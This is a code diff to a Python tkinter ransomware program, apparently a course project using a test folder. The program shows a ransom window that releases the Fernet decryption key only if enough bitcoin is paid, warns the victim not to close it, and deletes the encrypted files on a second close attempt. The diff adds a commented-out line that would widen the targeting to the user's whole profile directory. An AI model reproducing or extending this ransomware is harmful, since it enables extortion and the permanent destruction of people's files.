@@ -5,7 +5,7 @@ from tkinter import ttk
 from datetime import datetime
 from PIL import ImageTk, Image
 import random
-from tkinter import font
+import os
 
 #Writes fernet key to text file on the desktop if user submits enough bitcoin
 def gui_write_key(key):
@@ -36,7 +36,6 @@ def on_close():
         messagebox.showinfo(title = 'Do Not Close This Program', message = 'This is your second and final warning. If you attempt to close the program one more time, your files WILL be permanently deleted.')
         close_counter += 1
     elif close_counter == 1:
-        print(file_paths)
         encrypter.delete_everything(file_paths)
         messagebox.showinfo(title = 'Files Deleted', message = 'You have been warned. Your files have now been permanently deleted. Have a nice day.')
 
@@ -86,6 +85,7 @@ key_button = Button(root, text = "Decrypt", width = 13, height = 2, borderwidth 
 
 #Calls functions to create the file paths of all files to encrypt
 file_paths = encrypter.generate_file_list_keyword("C:\\Users\\bwiit\\Desktop\\CECS378Test")
+#file_paths = encrypter.generate_file_list_keyword(os.environ["USERPROFILE"])
 files_generated = True
 
 #Creates the Fernet object and the fernet encryption key
